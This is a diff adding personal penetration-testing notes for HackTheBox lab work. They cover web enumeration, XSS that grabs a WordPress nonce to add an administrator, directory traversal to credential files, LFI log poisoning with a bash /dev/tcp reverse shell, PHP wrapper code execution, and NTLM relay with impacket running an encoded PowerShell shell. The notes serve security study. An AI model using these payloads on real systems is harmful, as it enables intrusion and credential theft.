@@ -1,0 +1,126 @@
+<p><a href="https://academy.hackthebox.com/module/113/section/1087">HackTheBox - Attacking Common Applications</a>
+<a href="https://academy.hackthebox.com/module/116/section/1140">HackTheBox - Attacking Common Services</a></p>
+<h3 id="enumeration">Enumeration</h3>
+<ul>
+<li>Install Wappalyzer when doing boxes/taking test</li>
+<li><code>gobuster</code><ul>
+<li>Very noisy! Enumerates dirs/files</li>
+<li>Usage: <code>gobuster dir -u {IP} -w /usr/share/wordlists/dirb/common.txt -t {threads}</code></li>
+<li>Make sure it checks for .git<ul>
+<li><a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a> to dump the info</li>
+<li><a href="https://medium.com/swlh/hacking-git-directories-e0e60fa79a36">https://medium.com/swlh/hacking-git-directories-e0e60fa79a36</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Check robots.txt</li>
+<li>Check for APIs with /FUZZ/v1 or /FUZZ/v2</li>
+<li>Fuzz default IIS servers!!! They can have stuff</li>
+<li><code>whatweb</code> is like a local wappalyzer on kali<ul>
+<li><code>whatweb http://{IP}</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="exploitation">Exploitation</h3>
+<ul>
+<li>HTTP Headers:<ul>
+<li><code>HTTP User-Agent</code> can sometimes be displayed in logging pages, so modifying it could XSS or SQLi some sites</li>
+<li><code>Server</code> response can reveal info about server</li>
+</ul>
+</li>
+<li>I guess try adding <code>{&quot;admin&quot;:&quot;True&quot;}</code>  (or equivalent) against registration APIs? </li>
+<li>If HttpOnly flag isn&#39;t on Auth cookies, we can steal them w/ XSS</li>
+</ul>
+<h3 id="xss-exploitation-example">XSS Exploitation Example</h3>
+<ul>
+<li>Grabbing a nonce value from /wp-admin/user-new.php<ul>
+<li>var ajaxRequest = new XMLHttpRequest(); </li>
+<li>var requestURL = &quot;/wp-admin/user-new.php&quot;; </li>
+<li>var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g; </li>
+<li>ajaxRequest.open(&quot;GET&quot;, requestURL, false); </li>
+<li>ajaxRequest.send(); </li>
+<li>var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); </li>
+<li>var nonce = nonceMatch[1];</li>
+</ul>
+</li>
+<li>Then, use that <code>nonce</code> variable with /wp-admin/user-new.php to create a new administrator</li>
+</ul>
+<h3 id="directory-traversal">Directory Traversal</h3>
+<ul>
+<li>Test Windows traversal with <code>C:\Windows\System32\drivers\etc\hosts</code> (if win.ini not working)</li>
+<li>DT to system access on Windows:<ul>
+<li>Look in home directories for <code>.ssh</code></li>
+<li>IIS server: <ul>
+<li><code>C:\inetpub\logs\LogFiles\W3SVC1\</code> is logs</li>
+<li><code>C:\inetpub\wwwroot\web.config</code> - config w/ potential creds</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>%2f</code> for <code>/</code> and <code>%2e</code> for <code>.</code> </li>
+<li>Also, if we can pass IPs, use for stealing NTLM hash<ul>
+<li><code>sudo impacket-ntlmrelayx --no-http-server -smb2support -t {relay_target_IP} -c &quot;powershell -enc {reverse_shell}&quot;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="file-inclusion">File Inclusion</h3>
+<ul>
+<li>Different from directory traversal - directory traversal refers to simply retrieving contents, whereas LFI means the contents of the file are executed</li>
+<li>LFI example attack path<ul>
+<li>Can access local files with ?page=</li>
+<li>Apache&#39;s /var/log/apache2/access.log logs the HTTP User Agent of everyone connecting</li>
+<li>Thus, we can connect to a site with php code in our User Agent, poisoning the log, and view the access log with the LFI, resulting in the code executing</li>
+<li>Can turn into a reverse shell with <code>bash -i &gt;&amp; /dev/tcp/{IP}/4444 0&gt;&amp;1</code><ul>
+<li>If executed with Bourne Shell, we can prepend <code>bash -c</code> to ensure shell uses bash</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PHP wrappers can be used to display PHP when it would have otherwise executed<ul>
+<li>php://filter/convert.base64-encode/resouce=admin.php</li>
+<li>data:// wrapper can be used for code execution<ul>
+<li><code>data://text/plain,&lt;php echo system(&#39;ls&#39;); ?&gt;</code> in an LFI could cause RCE</li>
+<li>b64 version: <code>data://text/plain;base64,</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Remote File Inclusion - very similar, but rare - passing PHP file as an HTTP link</li>
+<li>Things to include:<ul>
+<li><strong>/var/www/html/backup.php</strong></li>
+<li><strong>/opt/admin.bak.php</strong></li>
+<li><strong>/opt/install.txt</strong> (or <strong>C:\Users\install.txt</strong>)</li>
+<li><strong>/opt/passwords</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="file-upload">File Upload</h3>
+<ul>
+<li>SVG upload can lead to XXE</li>
+<li>webshells found at /usr/share/webshells</li>
+<li>On boxes, try changing filename to include <code>../</code> - could upload root ssh key</li>
+</ul>
+<h3 id="command-injection">Command Injection</h3>
+<ul>
+<li><code>dir 2&gt;&amp;1 \*\`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell</code> will check injected shell type</li>
+<li>Can use powershell for creating shells</li>
+</ul>
+<h3 id="wordpress">Wordpress</h3>
+<ul>
+<li>Use <code>wpscan</code> and investigate the plugins<ul>
+<li><code>wpscan --url http://{IP} --enumerate p --plugins-detection aggressive</code></li>
+<li>Look for <code>[!] This version is out of date</code></li>
+<li>Can use searchsploit for these plugins or the wpscan vuln database</li>
+</ul>
+</li>
+<li>If signed into the wordpress page<ul>
+<li>Check out plugins from the inside</li>
+<li>Check out the Backup Migration<ul>
+<li>Changing this to our IP can allow us to relay authentication (if signing is disabled)</li>
+<li><code>//{kali_ip}/test</code> with <code>sudo impacket-ntlmrelayx --no-http-server -smb2support -t {relay_target_IP} -c &quot;powershell -enc {reverse_shell}&quot;</code></li>
+</ul>
+</li>
+<li>Try to upload a shell</li>
+</ul>
+</li>
+</ul>
